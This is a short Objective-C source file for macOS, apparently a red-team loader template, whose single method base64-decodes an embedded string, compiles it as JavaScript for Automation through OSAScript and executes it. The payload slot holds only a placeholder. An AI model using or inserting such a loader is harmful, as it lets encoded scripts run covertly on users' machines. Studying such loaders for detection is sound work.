#include "sample.h"

@implementation Sample
-(void)jxa {
    NSString *mycode = @"put_bse64_encoded_jxa_payload_here";
    NSData *decoded = [[NSData alloc] initWithBase64EncodedString:mycode options:0];
    NSString *decoded2 = [[NSString alloc] initWithData:decoded encoding:NSUTF8StringEncoding];
    OSALanguage *lang = [OSALanguage languageForName:@"JavaScript"];
    OSAScript *script = [[OSAScript alloc] initWithSource:decoded2 language:lang];
    NSDictionary *__autoreleasing compileError;
    [script compileAndReturnError:&compileError];
    NSDictionary *__autoreleasing runError;
    NSAppleEventDescriptor *res = [script executeAndReturnError:&runError];
    NSString *output = [NSString stringWithFormat:@"%@", res];
    NSLog(output);

}
@end
